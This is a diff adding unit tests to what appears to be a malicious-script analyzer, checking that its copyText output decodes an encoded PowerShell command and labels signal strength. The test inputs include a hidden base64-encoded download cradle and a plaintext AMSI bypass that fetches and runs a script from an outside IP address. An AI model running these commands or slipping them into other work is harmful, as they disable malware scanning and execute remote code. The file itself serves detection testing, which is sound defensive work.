@@ -139,3 +139,18 @@ describe('analyze — signals in copyText (Phase 3)', () => {
     expect(r.copyText).not.toContain('High-confidence malicious behaviour')
   })
 })
+
+describe('copyText — decoded script + base specificity (quick wins)', () => {
+  const encCradle =
+    'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
+  it('includes the decoded script text, not just transform labels', async () => {
+    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
+    expect(r.copyText).toMatch(/Decoded script:/)
+    expect(r.copyText).toContain('DownloadString') // the real decoded payload
+  })
+  it('lists each signal at its BASE specificity, consistent with the characterization gate', async () => {
+    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
+    expect(r.copyText).toContain('[strong] download cradle')
+    expect(r.copyText).not.toContain('[near-dispositive] download cradle')
+  })
+})
